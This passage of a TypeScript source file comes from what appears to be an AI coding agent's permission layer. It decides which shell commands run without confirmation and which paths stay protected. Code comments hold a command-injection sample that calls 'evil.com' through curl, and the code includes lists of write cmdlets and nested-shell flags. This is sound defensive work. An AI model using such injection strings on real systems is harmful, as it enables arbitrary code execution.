/**
 * Permission Utilities
 *
 * 权限工具函数 - 模式解析、匹配、路径检查
 *
 * Pattern format (ONLY for Bash tool in accept-edits mode):
 * - "Bash(npm install)" - exact command match
 * - "Bash(git commit:*)" - prefix wildcard match (matches "git commit -m 'msg'" etc.)
 * - "Bash(npm:*)" - command prefix wildcard (matches "npm install", "npm run build" etc.)
 *
 * Note: Bash(*) is REJECTED for safety. Use specific command patterns.
 */

import fs from 'fs';
import path from 'path';
import os from 'os';

import {
  getAgentConfigHome,
  isPathInsideDirectory,
  resolveExecutionPath,
} from '@kodax-ai/agent';
import type { BashPrefixExtractor, BashPrefixResult } from '@kodax-ai/coding';
import { isToolPlanModeAllowed } from '@kodax-ai/coding';

import { PermissionMode, MODIFICATION_TOOLS, FILE_MODIFICATION_TOOLS, BASH_WRITE_COMMANDS, BASH_SAFE_READ_COMMANDS } from './types.js';
import { isNullDevice, parseBashCommand } from './bash-ast.js';
import { analyzePowerShellMutation } from './powershell-mutation.js';

const PLAN_MODE_PROJECT_DOC_RELATIVE_PATH = path.join('.agent', 'plan_mode_doc.md');
const existingPathPrefixCache = new Map<string, string>();
let cachedSystemTempDirectories: string[] | null = null;

// ============== Pattern Parsing and Matching ==============

/**
 * Check if a single bash command (no &&) is a safe read-only operation.
 * Used internally by isBashReadCommand for compound command validation.
 *
 * 检查单个 bash 命令（不含 &&）是否是安全的只读操作。
 * 供 isBashReadCommand 内部用于复合命令验证。
 *
 * @param command - single bash command string (no &&)
 * @returns true if the command is a safe read operation
 */
function isSingleBashReadCommand(command: string): boolean {
  if (!command || !command.trim()) {
    return false;
  }
  
  // Normalize spaces for simpler matching (e.g., "git  status" -> "git status")
  const normalizedCommand = command.trim().replace(/\s+/g, ' ').toLowerCase();

  // 1. Base command validation: Must start with a whitelisted command
  // e.g. "git status -s" starts with "git status"
  for (const safeCmd of BASH_SAFE_READ_COMMANDS) {
    if (normalizedCommand === safeCmd || normalizedCommand.startsWith(safeCmd + ' ')) {
      // Additional safety checks for specific tools
      if (safeCmd === 'sed') {
        const parts = normalizedCommand.split(/\s+/);
        // Catch -i, -i.bak, -i'', etc.
        if (parts.some(p => p.startsWith('-i') || p === '--in-place')) {
          return false; // Modifies file in-place
        }
      }

      if (safeCmd === 'awk') {
        const parts = normalizedCommand.split(/\s+/);
        // Block script execution from file which might have side effects
        if (parts.includes('-f') || parts.includes('--file')) {
          return false;
        }
      }

      // Block arbitrary code execution for language tools (version/info only)
      const languageTools = ['node', 'npm', 'yarn', 'pnpm', 'tsc', 'python', 'pip', 'go', 'cargo', 'rustc', 'ruby', 'perl'];
      if (languageTools.includes(safeCmd)) {
        const parts = normalizedCommand.split(/\s+/).slice(1); // skip the command itself
        // Only allow info flags like -v, --version, -h, --help
        // If there are any other arguments (like a script name or -e), require confirmation
        if (parts.length > 0 && !parts.every(p => /^(-v|--version|-h|--help)$/.test(p))) {
          return false;
        }
      }
      return true;
    }
  }

  return false; // Default to denying (requiring confirmation)
}

/**
 * Token pattern for `isHelpCommand` non-flag tokens. Strict alphanumeric match —
 * rejects paths (`./bin/foo`), versioned filenames (`script.js`), shell metachars
 * (`$VAR`), and any other construct that could be smuggled past a "looks like a
 * help command" check.
 */
const HELP_COMMAND_TOKEN_PATTERN = /^[a-zA-Z0-9]+$/;

/**
 * FEATURE_154 — universal `--help` fast-path (parity with Claude Code
 * `commands.ts:isHelpCommand` at [commands.ts:388-436]).
 *
 * Returns `true` for commands of the shape `[CMD [SUBCMD ...]] --help` where
 * every non-flag token is a simple alphanumeric identifier and `--help` is
 * the only flag. These commands are unconditionally safe (programs print
 * help and exit), so they fast-path past the LLM classifier (FEATURE_092)
 * and the safe-read whitelist.
 *
 * Why: KodaX's auto-mode classifier costs an LLM call per tool invocation.
 * Paying token cost on every `kubectl --help` / `docker --help` etc. is
 * waste. Pre-FEATURE_154, KodaX only fast-pathed `--help` for ~12 language
 * tools (`node` / `npm` / `python` / etc.) via the `languageTools` carve-out
 * in `isSingleBashReadCommand`; this generalises to any command name.
 *
 * Strict by design (matches CC):
 *   - Must end with `--help` (after trim)
 *   - Must NOT contain `'` or `"` (could hide injection behind alphanumerics)
 *   - Must contain `--help` exactly; any other flag (`-c`, `--version`, etc.) → false
 *   - Every non-flag token must match `/^[a-zA-Z0-9]+$/` (rejects paths,
 *     versioned files, env vars, shell metacharacters)
 *
 * Slightly stricter than CC on `$VAR` (CC's shell-quote tokenizer represents
 * env-substitutions as object tokens that the loop skips, effectively
 * letting them pass; KodaX's simple split sees them as strings and rejects.
 * The stricter behavior is a deliberate safety choice.).
 */
export function isHelpCommand(command: string): boolean {
  const trimmed = command.trim();
  if (!trimmed.endsWith('--help')) {
    return false;
  }
  // Reject any quoted argument — could hide injection (`python -c 'evil()' --help`).
  if (trimmed.includes('"') || trimmed.includes("'")) {
    return false;
  }

  let foundHelp = false;
  for (const token of trimmed.split(/\s+/)) {
    if (token.startsWith('-')) {
      if (token === '--help') {
        foundHelp = true;
      } else {
        return false;
      }
    } else {
      if (!HELP_COMMAND_TOKEN_PATTERN.test(token)) {
        return false;
      }
    }
  }
  return foundHelp;
}

/**
 * Check if a bash command is strictly a safe read-only operation (Whitelist).
 *
 * FEATURE_152 (v0.7.38): replaces the pre-AST regex strip-then-classify
 * pipeline with `parseBashCommand` from `bash-ast.ts`. The AST gives us:
 *   - statements split on `&&` / `||` / `;` (we only allow null and `&&`),
 *   - pipeline stages split on `|` (every stage must be a safe-read command),
 *   - per-stage redirections (input redirects rejected; output redirects only
 *     allowed when the target is a null device, which discards output rather
 *     than writing — preserves Issue 129 behavior),
 *   - `unparseable: true` for inputs we can't model (heredocs, command
 *     substitution `$(...)`, backticks, bare `&`, etc.) — fail-closed to
 *     `false` so unmodeled syntax always falls through to confirmation.
 *
 * Per-stage syntactic checks (`isSingleBashReadCommand`) are unchanged —
 * the AST migration only replaces the splitting + null-device-strip layer.
 *
 * @param command - bash command string
 * @returns true if the command is a safe read operation
 */
export function isBashReadCommand(command: string): boolean {
  if (!command || !command.trim()) {
    return false;
  }

  // FEATURE_154: universal `--help` fast-path. `* --help` is unconditionally
  // safe — programs print help and exit. Skipping the rest of the parser
  // (and, in auto mode, the LLM classifier) saves a Haiku/main-model call
  // per help invocation. See isHelpCommand for the strict admission rules.
  if (isHelpCommand(command)) {
    return true;
  }

  // FEATURE_152: AST parse. Line continuations (`\<newline>`) are not
  // typically present in single-line tool inputs; collapse them defensively
  // before parse so multi-line history paste still works.
  const collapsed = command.trim().replace(/\\\r?\n/g, ' ');
  const tree = parseBashCommand(collapsed);
  if (tree.unparseable || tree.statements.length === 0) {
    return false;
  }

  const isCompound = tree.statements.length > 1
    || (tree.statements[0]?.stages.length ?? 0) > 1;

  for (const stmt of tree.statements) {
    // Only allow null (first stmt) or `&&` between statements. `||` and `;`
    // were rejected by the pre-AST `baseIllegalSyntax` regex; preserved here.
    if (stmt.precedingOp !== null && stmt.precedingOp !== '&&') {
      return false;
    }

    for (const stage of stmt.stages) {
      // Redirection policy:
      //   - input redirects (`<`, `<<`, `<<<`) → reject (could read from
      //     anything, breaks read-only contract).
      //   - output redirects (`>`, `>>`, `2>`, `&>`, etc.) → reject UNLESS
      //     target is a null device. fd-redirect to null discards output;
      //     this is the Issue 129 carve-out, now expressed structurally.
      for (const redir of stage.redirections) {
        if (redir.input) return false;
        if (!isNullDevice(redir.target)) return false;
      }

      // Stage commands run through `isSingleBashReadCommand` exactly as
      // before — argv joined back into a string preserves the existing
      // tokenizer's expectations (e.g. `git status -s` → starts-with-match).
      const stageStr = stage.argv.join(' ');
      if (!stageStr) continue;

      // 'cd <path>' is allowed only inside compound commands (preserves
      // the pre-AST behavior — bare `cd` alone is not a "read" operation).
      if (isCompound && stage.argv[0]?.toLowerCase() === 'cd' && stage.argv.length >= 2) {
        continue;
      }

      if (!isSingleBashReadCommand(stageStr)) {
        return false;
      }
    }
  }

  return true;
}

export function getDirectShellBypassBlockReason(command: string): string | null {
  const normalizedCommand = command.trim();

  if (!normalizedCommand) {
    return '[Shell: No command provided]';
  }

  if (isBashReadCommand(normalizedCommand)) {
    return null;
  }

  return `[Blocked] Direct !command execution only supports safe read-only commands. Use the bash tool for commands that write files, invoke shells, or require confirmation.`;
}

/**
 * PowerShell write cmdlets that don't appear in `BASH_WRITE_COMMANDS` (which
 * only lists POSIX-y verbs). These can appear ANYWHERE in argv (not just
 * argv[0]) because PowerShell pipelines compose them inline:
 *   `Get-ChildItem | Set-Content foo.txt`  → second stage's argv[0]
 *   `New-Item -Path foo`                    → first stage's argv[0]
 * `ni` is the New-Item alias; `del` / `copy` / `move` / `ren` already covered
 * by `BASH_WRITE_COMMANDS`.
 */
const POWERSHELL_WRITE_TOKENS = new Set([
  'remove-item',
  'set-content',
  'add-content',
  'out-file',
  'new-item',
  'copy-item',
  'move-item',
  'rename-item',
  'ni',
]);

const NESTED_SHELL_COMMAND_FLAGS: Readonly<Record<string, ReadonlySet<string>>> = {
  bash: new Set(['-c']),
  dash: new Set(['-c']),
  sh: new Set(['-c']),
  zsh: new Set(['-c']),
  cmd: new Set(['/c']),
  powershell: new Set(['-command', '-c']),
  pwsh: new Set(['-command', '-c']),
};

function getNestedShellCommand(argv: readonly string[]): string | undefined {
  const executablePath = argv[0]?.replace(/\\/g, '/');
  const executable = executablePath
    ?.slice(executablePath.lastIndexOf('/') + 1)
    .replace(/\.exe$/i, '')
    .toLowerCase();
  if (!executable) return undefined;
  const flags = NESTED_SHELL_COMMAND_FLAGS[executable];
  if (!flags) return undefined;
  const flagIndex = argv.findIndex((value, index) => index > 0 && flags.has(value.toLowerCase()));
  return flagIndex >= 0 ? argv[flagIndex + 1] : undefined;
}

/**
 * Check if a bash command is a write operation.
 *
 * FEATURE_152 (v0.7.38): replaces the pre-AST regex blacklist with
 * `parseBashCommand` from `bash-ast.ts`. The AST eliminates two whole
 * classes of false positives the regex chain had:
 *   1. **Issue 129 strip-then-classify**: pre-AST code regex-stripped
 *      `2>NUL` / `2>/dev/null` BEFORE pattern matching, then ran a
 *      blacklist of pre-compiled regexes. The strip was fragile — any
 *      future fd-redirect form would re-introduce the false positive.
 *      Now redirections are structured tokens with a `target` field;
 *      `isNullDevice(target)` is the single source of truth.
 *   2. **Substring matches inside argv strings**: pre-AST `\\bset-content\\b`
 *      matched `set-content` even when it appeared inside a quoted string
 *      argument or inside a path. AST argv tokens are post-quote-stripping
 *      so PowerShell verb checks compare against actual command names.
 *
 * Detection rules (per-stage):
 *   - argv[0] OR argv[0..1] (joined with space) matches any entry in
 *     `BASH_WRITE_COMMANDS` (handles both `rm` and `git commit`).
 *   - any argv token matches a `POWERSHELL_WRITE_TOKENS` entry (these can
 *     appear inline, not just at stage start, due to PowerShell pipeline
 *     conventions — `ls | Set-Content foo` puts the verb at argv[0] of
 *     stage 2, but `New-Item -Path foo -Value bar` has it as argv[0] of
 *     stage 1; we cover both with a token-anywhere check).
 *   - any non-input redirection whose target is NOT a null device.
 *
 * Unparseable inputs (heredocs, `$(...)`) are conservatively returned as
 * `false` to match the pre-AST regex chain's behavior — those inputs just
 * didn't match anything in the regex blacklist either. Plan-mode and
 * auto-mode handle the unparseable case via separate confirmation paths.
 *
 * @param command - bash command string
 * @returns true if the command is a write operation
 */
export function isBashWriteCommand(command: string): boolean {
  return isBashWriteCommandAtDepth(command, 0);
}

function isBashWriteCommandAtDepth(command: string, depth: number): boolean {
  if (!command || !command.trim()) {
    return false;
  }

  const tree = parseBashCommand(command);
  if (tree.unparseable) {
    // Match pre-AST behavior on unparseable inputs (return false). Plan-
    // mode + auto-mode upstream pipelines treat unparseable bash as a
    // confirmation case via different logic — this function is purely
    // "does the command match a known write pattern".
    return false;
  }

  for (const stmt of tree.statements) {
    for (const stage of stmt.stages) {
      const argvLower = stage.argv.map((tok) => tok.toLowerCase());

      // Rule 1: argv[0] / argv[0..1] against BASH_WRITE_COMMANDS
      if (argvLower.length > 0) {
        const first = argvLower[0]!;
        const firstTwo = argvLower.length >= 2
          ? `${argvLower[0]} ${argvLower[1]}`
          : null;
        for (const writeCmd of BASH_WRITE_COMMANDS) {
          if (writeCmd === first) return true;
          if (firstTwo !== null && writeCmd === firstTwo) return true;
        }
      }

      // Rule 2: PowerShell verb anywhere in argv
      for (const token of argvLower) {
        if (POWERSHELL_WRITE_TOKENS.has(token)) return true;
      }

      // Rule 3: non-input redirect to a real (non-null-device) target
      for (const redir of stage.redirections) {
        if (redir.input) continue;
        if (!isNullDevice(redir.target)) return true;
      }

      const nested = depth < 3 ? getNestedShellCommand(stage.argv) : undefined;
      if (nested !== undefined && isBashWriteCommandAtDepth(nested, depth + 1)) return true;
    }
  }

  return false;
}

/**
 * Parse allowed tool pattern - 解析允许的工具模式
 *
 * Formats:
 * - "read" -> { tool: "read", pattern: null }
 * - "Edit(*)" -> { tool: "Edit", pattern: "*" }
 * - "Bash(npm install)" -> { tool: "Bash", pattern: "npm install" }
 * - "Bash(git commit:*)" -> { tool: "Bash", pattern: "git commit:*" }
 */
export function parseAllowedToolPattern(entry: string): { tool: string; pattern: string | null } {
  const match = entry.match(/^([a-zA-Z_][a-zA-Z0-9_]*)\((.+)\)$/);
  if (match) {
    return { tool: match[1].toLowerCase(), pattern: match[2] };
  }
  return { tool: entry.toLowerCase(), pattern: null };
}

/**
 * Check if a bash command matches an allowed pattern using LEGACY naive
 * `startsWith` semantics. Used when no LLM-backed prefix extractor is
 * available — see `matchesBashPatternByExtractedPrefix` for the safer path.
 *
 * SECURITY NOTE: this path is vulnerable to command injection via shell
 * metacharacters (`git commit -m "x" $(curl evil.com)` matches `git commit:*`).
 * It is preserved for backward compatibility with SDK consumers that don't
 * have an LLM provider available; the KodaX REPL itself ALWAYS provides
 * an extractor in production, so this branch is only exercised by tests
 * and headless embeds. Will be removed when all known consumers migrate
 * (target: v0.8).
 */
function matchesBashPatternLegacy(command: string, pattern: string): boolean {
  // Reject "*" pattern for safety
  if (pattern === '*') return false;

  // Prefix wildcard: "git commit:*" matches "git commit -m 'msg'"
  if (pattern.endsWith(':*')) {
    const prefix = pattern.slice(0, -2);
    return command.startsWith(prefix);
  }

  // Exact match
  return command === pattern;
}

/**
 * Match a pattern against the LLM-extracted SAFE PREFIX of a command
 * (FEATURE_153). The extracted prefix is itself the safe prefix, so
 * matching is exact equality (vs. legacy `startsWith` which let injection
 * sneak past).
 *
 * Examples (where extractedPrefix is the LLM output for the user's command):
 *   command: 'git commit -m "msg"',  extractedPrefix: 'git commit'
 *     pattern 'git commit:*'  → match (prefix === 'git commit')
 *     pattern 'git commit'    → match (exact)
 *     pattern 'git diff:*'    → NO match
 *   command: 'git commit -m "x" $(curl evil)',  extractedPrefix: null
 *     ANY pattern             → NO match (extractor said injection)
 */
function matchesBashPatternByExtractedPrefix(
  extractedPrefix: string,
  pattern: string,
): boolean {
  if (pattern === '*') return false;
  if (pattern.endsWith(':*')) {
    const prefix = pattern.slice(0, -2);
    return extractedPrefix === prefix;
  }
  return extractedPrefix === pattern;
}

/**
 * Check if a tool call is allowed by the user's allowlist patterns.
 *
 * FEATURE_153 (v0.7.38) — When `extractor` is supplied, bash commands are
 * routed through the LLM-backed prefix extractor, which:
 *   - Returns the SAFE PREFIX of the command (e.g. `git commit` for
 *     `git commit -m "msg"`)
 *   - Returns `injection_detected` for inputs containing command injection
 *     (`git commit -m "x" $(curl evil.com)`)
 *   - Returns `no_prefix` when no safe prefix can be determined
 * Patterns then match against the extracted prefix exactly. This eliminates
 * the pre-FEATURE_153 startsWith-based injection surface.
 *
 * When `extractor` is NOT supplied, falls back to the legacy
 * `command.startsWith(pattern)` matcher. Documented as insecure in
 * `matchesBashPatternLegacy` — KodaX's REPL always supplies an extractor in
 * production; the legacy branch exists for tests and headless SDK consumers
 * without LLM access.
 *
 * Note: Only Bash tool is supported for pattern matching.
 *
 * @param toolName — tool name (only "bash" / "Bash" matched)
 * @param input    — tool call input; reads `input.command`
 * @param allowedPatterns — entries like `Bash(git commit:*)` from
 *                          `~/.kodax/config.json` `alwaysAllowTools`
 * @param extractor — optional LLM-backed bash prefix extractor (FEATURE_153)
 * @param signal    — optional abort signal forwarded to the extractor
 */
export async function isToolCallAllowed(
  toolName: string,
  input: Record<string, unknown>,
  allowedPatterns: string[],
  extractor?: BashPrefixExtractor,
  signal?: AbortSignal,
): Promise<boolean> {
  if (toolName.toLowerCase() !== 'bash') {
    return false;
  }

  const command = (input.command as string) ?? '';

  // Determine which patterns are relevant for bash. If none, no LLM call needed.
  const bashPatterns: Array<{ pattern: string | null }> = [];
  for (const entry of allowedPatterns) {
    const parsed = parseAllowedToolPattern(entry);
    if (parsed.tool !== 'bash') continue;
    if (parsed.pattern === null) {
      // Bare `Bash` pattern (no parens content) auto-allows all bash —
      // matches legacy semantics, no extractor call needed.
      return true;
    }
    bashPatterns.push({ pattern: parsed.pattern });
  }
  if (bashPatterns.length === 0) {
    return false;
  }

  // FEATURE_153 path: extract once, match against extracted prefix.
  if (extractor) {
    // Fail-closed on transient extractor failures (timeout / network / abort
    // / invalid provider). The extractor module deliberately throws on these
    // so its LRU cache can evict the failed slot — but that means callers
    // need to handle the throw. We centralise it here so all 4 production
    // call sites (REPL, InkREPL, ACP server, executor.ts) get consistent
    // graceful fallback to the confirmation prompt instead of an unhandled
    // rejection bubbling into the tool-execution loop.
    let result: BashPrefixResult;
    try {
      result = await extractor.extract(command, signal);
    } catch {
      return false;
    }
    if (result.kind !== 'prefix') {
      // injection_detected / no_prefix → no allowlist pattern can match
      // (treat as "user hasn't allowlisted this") so the command falls
      // through to the standard confirmation prompt.
      return false;
    }
    for (const { pattern } of bashPatterns) {
      if (pattern && matchesBashPatternByExtractedPrefix(result.value, pattern)) {
        return true;
      }
    }
    return false;
  }

  // Legacy path: naive startsWith.
  for (const { pattern } of bashPatterns) {
    if (pattern && matchesBashPatternLegacy(command, pattern)) {
      return true;
    }
  }
  return false;
}

/**
 * Generate pattern string for saving
 */
export function generateSavePattern(
  toolName: string,
  input: Record<string, unknown>,
  allowAll: boolean
): string {
  if (toolName.toLowerCase() !== 'bash') {
    return '';
  }

  const command = (input.command as string) ?? '';
  const parts = command.split(' ');

  if (parts.length > 1) {
    const baseCommand = parts.slice(0, 2).join(' ');
    return `Bash(${baseCommand}:*)`;
  }

  return `Bash(${command})`;
}

// ============== Path Checking ==============

/**
 * Check if target path requires always-confirm (permanent protection zones)
 *
 * Protected zones (always require confirmation, regardless of mode):
 * - .kodax/ project config directory
 * - ~/.kodax/ user config directory
 * - Paths outside the project root AND outside the system temp directory
 *
 * System temp directories (`os.tmpdir()` and `$TEMP` / `$TMP` / `$TMPDIR`) are
 * treated as a safe scratchpad in all modes — writing there is auto-allowed.
 * This aligns with plan mode's `isPlanModeAllowedPath` semantics: both modes
 * already explicitly permit system-temp writes, so accept-edits and
 * auto-in-project should not be stricter than plan mode on this dimension.
 */
export function isAlwaysConfirmPath(targetPath: string, projectRoot: string): boolean {
  try {
    const normalizedPath = path.resolve(targetPath);
    const normalizedRoot = path.resolve(projectRoot);
    const userKodaxDir = getAgentConfigHome();
    const projectKodaxDir = path.join(normalizedRoot, '.kodax');

    // .kodax/ project config directory — always protected
    if (isPathInsideDirectory(normalizedPath, projectKodaxDir)) {
      return true;
    }

    // ~/.kodax/ user config directory — always protected
    if (isPathInsideDirectory(normalizedPath, userKodaxDir)) {
      return true;
    }

    // Inside project — not "always confirm"
    if (isPathInsideDirectory(normalizedPath, normalizedRoot)) {
      return false;
    }

    // Outside project but inside system temp — safe scratchpad, not "always confirm"
    const systemTempDirs = getSystemTempDirectories();
    if (systemTempDirs.some(tempDir => isPathInsideDirectory(normalizedPath, tempDir))) {
      return false;
    }

    // Outside project AND outside system temp — require confirmation
    return true;
  } catch {
    // Path parsing errors should degrade to "not protected" instead of crashing permission checks.
    return false;
  }
}

/**
 * Heuristic: does this argv token look like a file path? Used by
 * `extractPathsFromCommand` to filter post-AST argv tokens. Mirrors the
 * pre-AST regex `pathPattern` plus a "looks-absolute" Windows / POSIX
 * fallback. Quoting is already stripped by AST tokenisation, so this
 * runs against the literal value the shell would see.
 */
function looksLikePath(token: string): boolean {
  if (!token || token.startsWith('-')) {
    return false; // flag, not a path
  }
  // Relative ./ or ../ paths (POSIX or Windows separators)
  if (/^\.\.?[/\\]/.test(token)) return true;
  // Home-relative
  if (token.startsWith('~/') || token.startsWith('~\\')) return true;
  // Windows drive-letter absolute (`C:\foo`)
  if (/^[a-zA-Z]:[/\\]/.test(token)) return true;
  // POSIX absolute (`/foo/bar`) — but on Windows, exclude single-letter
  // cmd.exe flag tokens like `findstr /R "v[0-9]"`, `dir /B`, `xcopy /Y`,
  // `where /R`, `fc /B`, `robocopy /MIR`. On Windows these `/X` tokens
  // are virtually always cmd flags; treating them as paths produces the
  // Issue 131 false-positive (path.resolve('/R') → 'C:\R' → triggers
  // protected-path on a non-existent fake path). POSIX behavior
  // unchanged: a `/R` token on Linux/macOS remains a path candidate.
  if (token.startsWith('/') && token.length > 1) {
    if (process.platform === 'win32' && IS_WINDOWS_CMD_FLAG.test(token)) {
      return false;
    }
    return true;
  }
  // Hidden-dir-relative (`.agent/plan_mode_doc.md`) — token has a separator
  // and starts with `.`, but not `..` (already matched above).
  if (token.startsWith('.') && /[/\\]/.test(token)) return true;
  // A normal directory prefix can still escape after normalization, e.g.
  // `subdir/../../outside.txt`. Shape checks must not discard traversal
  // before the executionCwd/projectRoot boundary comparison runs.
  if (token.split(/[/\\]+/).includes('..')) return true;
  return false;
}

/**
 * Windows cmd / PowerShell flag shape: `/X`, `/MIR`, `/A:H`, `/COPY:DAT`.
 * Requires:
 *   - leading `/`
 *   - body is alphanumeric (`A-Za-z0-9`)
 *   - optional `:value` suffix where value is also alphanumeric
 *   - NO further path separators (`/` or `\`) — those would indicate a
 *     real path like `/etc/passwd`
 *
 * Examples MATCHED (treated as flag, NOT path):
 *   /R  /B  /Y  /I  /V  /S  /MIR  /A:H  /D:2024  /COPY:DAT
 * Examples NOT MATCHED (treated as path):
 *   /usr/local/bin  /etc/passwd  /tmp/foo  /R/file  /A:H/sub
 */
const IS_WINDOWS_CMD_FLAG = /^\/[A-Za-z][A-Za-z0-9]*(?::[A-Za-z0-9]+)?$/;

const INLINE_SCRIPT_FLAGS: Readonly<Record<string, ReadonlySet<string>>> = {
  python: new Set(['-c']),
  py: new Set(['-c']),
  node: new Set(['-e', '--eval', '-p', '--print']),
  ruby: new Set(['-e']),
  perl: new Set(['-e']),
};
const REGEX_SOURCE_COMMANDS: ReadonlySet<string> = new Set([
  'rg',
  'ripgrep',
  'grep',
  'egrep',
  'fgrep',
  'findstr',
  'select-string',
  'sed',
  'awk',
]);
const EXPLICIT_REGEX_FLAGS: ReadonlySet<string> = new Set([
  '-e',
  '--regexp',
  '--regex',
  '-pattern',
]);
const REGEX_SOURCE_FILE_FLAGS: ReadonlySet<string> = new Set(['-f', '--file']);
const RG_SOURCE_VALUE_FLAGS: ReadonlySet<string> = new Set([
  '-g',
  '--glob',
  '--iglob',
  '-r',
  '--replace',
]);
const GREP_SOURCE_VALUE_FLAGS: ReadonlySet<string> = new Set([
  '--include',
  '--exclude',
  '--exclude-dir',
]);
const REGEX_SOURCE_VALUE_FLAGS: Readonly<Record<string, ReadonlySet<string>>> = {
  rg: RG_SOURCE_VALUE_FLAGS,
  ripgrep: RG_SOURCE_VALUE_FLAGS,
  grep: GREP_SOURCE_VALUE_FLAGS,
  egrep: GREP_SOURCE_VALUE_FLAGS,
  fgrep: GREP_SOURCE_VALUE_FLAGS,
  awk: new Set(['-v', '--assign']),
  'select-string': new Set(['-inputobject']),
};
const REGEX_PATH_VALUE_FLAGS: Readonly<Record<string, ReadonlySet<string>>> = {
  rg: new Set(['--ignore-file']),
  ripgrep: new Set(['--ignore-file']),
  grep: new Set(['--exclude-from']),
  egrep: new Set(['--exclude-from']),
  fgrep: new Set(['--exclude-from']),
  'select-string': new Set(['-path', '-literalpath']),
};

function commandBasename(value: string): string {
  const normalized = value.replace(/\\/g, '/');
  return (normalized.split('/').pop() ?? normalized).toLowerCase().replace(/\.exe$/, '');
}

interface CommandArgumentRoles {
  readonly sourceIndexes: Set<number>;
  readonly pathIndexes: Set<number>;
  readonly pathValues: Set<string>;
}

function createCommandArgumentRoles(): CommandArgumentRoles {
  return {
    sourceIndexes: new Set<number>(),
    pathIndexes: new Set<number>(),
    pathValues: new Set<string>(),
  };
}

function addIndexedValue(
  argv: readonly string[],
  index: number,
  indexes: Set<number>,
  values?: Set<string>,
): void {
  const value = argv[index];
  if (value === undefined) return;
  indexes.add(index);
  values?.add(value);
}

function attachedOptionValue(token: string, flag: string): string | undefined {
  const lower = token.toLowerCase();
  if (flag.startsWith('--')) {
    const prefix = `${flag}=`;
    return lower.startsWith(prefix) ? token.slice(prefix.length) : undefined;
  }
  return lower.startsWith(flag) && token.length > flag.length
    ? token.slice(flag.length)
    : undefined;
}

function collectScriptSourceRoles(
  argv: readonly string[],
  flags: ReadonlySet<string>,
  roles: CommandArgumentRoles,
): void {
  for (let index = 1; index < argv.length; index += 1) {
    const token = argv[index] ?? '';
    const lower = token.toLowerCase();
    for (const flag of flags) {
      if (lower === flag) {
        addIndexedValue(argv, index + 1, roles.sourceIndexes);
        break;
      }
      const attached = attachedOptionValue(token, flag);
      if (attached !== undefined) {
        roles.sourceIndexes.add(index);
        break;
      }
    }
  }
}

function collectFlagValueRoles(
  argv: readonly string[],
  flags: ReadonlySet<string> | undefined,
  indexes: Set<number>,
  values?: Set<string>,
): void {
  if (!flags) return;
  for (let index = 1; index < argv.length; index += 1) {
    const token = argv[index] ?? '';
    if (token === '--') break;
    const lower = token.toLowerCase();
    for (const flag of flags) {
      if (lower === flag) {
        addIndexedValue(argv, index + 1, indexes, values);
        break;
      }
      const attached = attachedOptionValue(token, flag);
      if (attached !== undefined) {
        indexes.add(index);
        values?.add(attached);
        break;
      }
    }
  }
}

function collectRegexArgumentRoles(argv: readonly string[], roles: CommandArgumentRoles): void {
  const command = commandBasename(argv[0] ?? '');
  collectFlagValueRoles(
    argv,
    REGEX_SOURCE_VALUE_FLAGS[command],
    roles.sourceIndexes,
  );
  collectFlagValueRoles(
    argv,
    REGEX_PATH_VALUE_FLAGS[command],
    roles.pathIndexes,
    roles.pathValues,
  );
  let hasExplicitPattern = false;
  for (let index = 1; index < argv.length; index += 1) {
    const token = argv[index] ?? '';
    if (token === '--') break;
    const lower = token.toLowerCase();
    if (command === 'findstr' && lower.startsWith('/c:')) {
      roles.sourceIndexes.add(index);
      hasExplicitPattern = true;
      continue;
    }
    if (command === 'findstr' && lower.startsWith('/g:')) {
      roles.pathIndexes.add(index);
      roles.pathValues.add(token.slice(3));
      hasExplicitPattern = true;
      continue;
    }
    for (const flag of EXPLICIT_REGEX_FLAGS) {
      if (lower === flag) {
        addIndexedValue(argv, index + 1, roles.sourceIndexes);
        hasExplicitPattern = true;
        break;
      }
      const attached = attachedOptionValue(token, flag);
      if (attached !== undefined) {
        roles.sourceIndexes.add(index);
        hasExplicitPattern = true;
        break;
      }
    }
    for (const flag of REGEX_SOURCE_FILE_FLAGS) {
      if (lower === flag) {
        addIndexedValue(argv, index + 1, roles.pathIndexes, roles.pathValues);
        hasExplicitPattern = true;
        break;
      }
      const attached = attachedOptionValue(token, flag);
      if (attached !== undefined) {
        roles.pathValues.add(attached);
        hasExplicitPattern = true;
        break;
      }
    }
  }
  if (!hasExplicitPattern) {
    let optionsEnded = false;
    for (let index = 1; index < argv.length; index += 1) {
      const token = argv[index] ?? '';
      if (token === '--') {
        optionsEnded = true;
        continue;
      }
      if (roles.sourceIndexes.has(index) || roles.pathIndexes.has(index)) continue;
      if (!optionsEnded && token.startsWith('-')) continue;
      if (command === 'findstr' && IS_WINDOWS_CMD_FLAG.test(token)) continue;
      addIndexedValue(argv, index, roles.sourceIndexes);
      break;
    }
  }
  let optionsEnded = false;
  for (let index = 1; index < argv.length; index += 1) {
    const token = argv[index] ?? '';
    if (token === '--') {
      optionsEnded = true;
      continue;
    }
    if (
      (!optionsEnded && token.startsWith('-'))
      || roles.sourceIndexes.has(index)
      || roles.pathIndexes.has(index)
    ) continue;
    if (command === 'findstr' && IS_WINDOWS_CMD_FLAG.test(token)) continue;
    addIndexedValue(argv, index, roles.pathIndexes, roles.pathValues);
  }
}

function collectCommandArgumentRoles(argv: readonly string[]): CommandArgumentRoles {
  const roles = createCommandArgumentRoles();
  const command = commandBasename(argv[0] ?? '');
  const scriptFlags = /^python(?:\d+(?:\.\d+)*)?$/.test(command)
    ? INLINE_SCRIPT_FLAGS.python
    : INLINE_SCRIPT_FLAGS[command];
  if (scriptFlags) collectScriptSourceRoles(argv, scriptFlags, roles);
  if (REGEX_SOURCE_COMMANDS.has(command)) collectRegexArgumentRoles(argv, roles);
  return roles;
}

/**
 * Pre-AST regex-based path scanner. Retained as a complementary pass
 * because shell-quote's POSIX tokenisation eats Windows backslash escapes:
 *   `rm C:\Users\foo\bar.txt` → AST argv is `['rm', 'C:Users', 'oo\bar.txt']`
 *                               (the `\U`, `\f`, `\b` are POSIX-escape-stripped).
 * The regex sees raw input and recognises `C:\foo`-style paths as one
 * coherent token, which is what callers (`isCommandOnProtectedPath`,
 * `collectBashWriteTargets`) actually need to make path-safety decisions.
 *
 * Pre-AST regex was the entire impl; here it's a Windows-path safety net
 * layered ON TOP of the AST argv pass. Tokens recognised by both are
 * de-duped at the `Set` level by the caller.
 */
interface RawCommandWord {
  readonly value: string;
  readonly start: number;
  readonly end: number;
}

function tokenizeRawCommandStages(command: string): readonly RawCommandWord[][] {
  const stages: RawCommandWord[][] = [];
  let words: RawCommandWord[] = [];
  let value = '';
  let start = -1;
